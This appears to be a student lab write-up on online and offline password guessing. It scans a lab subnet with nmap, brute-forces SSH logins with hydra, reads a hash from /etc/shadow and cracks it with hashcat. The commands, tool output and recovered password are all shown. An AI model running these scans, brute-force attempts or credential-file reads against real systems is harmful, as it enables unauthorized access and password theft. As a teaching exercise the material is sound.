# Lab 5 - Online and Offline Password Guessing

## Setup

1. Check we are connected to the local server

```bash
ping a507-server.local
```

1. Install `nmap` 

```bash
sudo apt-get install nmap
```

1. Install `hydra`

```bash
sudo apt-get install hydra
```

1. Install `hashcat`

```bash
sudo apt-get install hashcat
```

1. Download dictionaries (for online and offline attacks) from local server

## Online attack

1. Use `nmap` to scan the ports within the target address range

```bash
nmap -v 10.0.15.0/28
```

1. We can see that our target port has the `ssh` port (22) open

```bash
Nmap scan report for 10.0.15.1
Host is up, received conn-refused (0.0014s latency).
Scanned at 2022-01-04 11:48:32 CET for 17s
Not shown: 999 closed ports
Reason: 999 conn-refused
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
```

1. We try to connect to that IP address but we can see we need a password
2. Now we will try to guess the password. With brute forcing it will take a long time, around 9 years. We can see that by running the hydra command with the next parameters
    1. lowercase letters
    2. 4-6 letters

```bash
hydra -l kastelan_tonino-x 4:6:a 10.0.15.1 -V -t 1 ssh
```

1. Lets’ now try to run hydra with a dictionary

```bash
hydra -l kastelan_tonino -P dictionary_online.txt 10.0.15.1 -V -t 4 ssh
```

1. Now we see the password will be quickly found. After it finds we can see the password is `ofthei`

```bash
[22][ssh] host: 10.0.15.1   login: kastelan_tonino   password: ofthei
```

1. We can now log in to the server using `ssh` and the password we found

```bash
ssh kastelan_tonino@10.0.15.1
```

## Offline attack

1. When we are logged in to the server we need to get the hash of the password to test our offline attack methods.
2. We can find our password hash inside `/etc/shadow` file:

```bash
kastelan_tonino:**$6$057ZnZ2fmazqC.0e$1Lc.YKIkaOLhzkfevlKzsoGotsbAj8lUPqerJOJuJRc7qfOxyCVYwwpzeZmYpkuXRfgeaGKxBAVaD35HVwRKf0**:18996:0:99999:7:::
```

1. We take the hash from there and save it locally to a file called `hash.txt`
2. Now we will use `hashcat` to try to crack the password offline without and with a dictionary. We can see that without a dictionary it will take a lot of time

```bash
Session..........: hashcat
Status...........: Running
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$057ZnZ2fmazqC.0e$1Lc.YKIkaOLhzkfevlKzsoGotsbAj8l...VwRKf0
Time.Started.....: Tue Jan  4 11:25:33 2022 (7 secs)
Time.Estimated...: **Thu Jan 20 11:18:38 2022** **(15 days, 23 hours)**
Guess.Mask.......: ?l?l?l?l?l?l [6]
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:      224 H/s (6.55ms)
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 1408/308915776 (0.00%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 0/11881376 (0.00%)
Candidates.#1....: darier -> djurer
HWMon.Dev.#1.....: N/A
```

1. Using a dictionary this operation is sped up a lot. Lets’ try with a offline dictionary

```bash
hashcat --force -m 1800 -a 0 hash.txt dictionary_offline.txt --status --status-timer 10
```

1. We can now see that `hashcat` found the password

```bash
**$6$057ZnZ2fmazqC.0e$1Lc.YKIkaOLhzkfevlKzsoGotsbAj8lUPqerJOJuJRc7qfOxyCVYwwpzeZmYpkuXRfgeaGKxBAVaD35HVwRKf0:ofthei**

Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$057ZnZ2fmazqC.0e$1Lc.YKIkaOLhzkfevlKzsoGotsbAj8l...VwRKf0
Time.Started.....: Tue Jan  4 11:27:22 2022 (8 secs)
Time.Estimated...: Tue Jan  4 11:27:30 2022 (0 secs)
Guess.Base.......: File (dictionary_offline.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:      237 H/s (6.46ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 2080/50072 (4.15%)
Rejected.........: 0/2080 (0.00%)
Restore.Point....: 1920/50072 (3.83%)
Candidates.#1....: kelzkj -> kkpgkt
HWMon.Dev.#1.....: N/A
```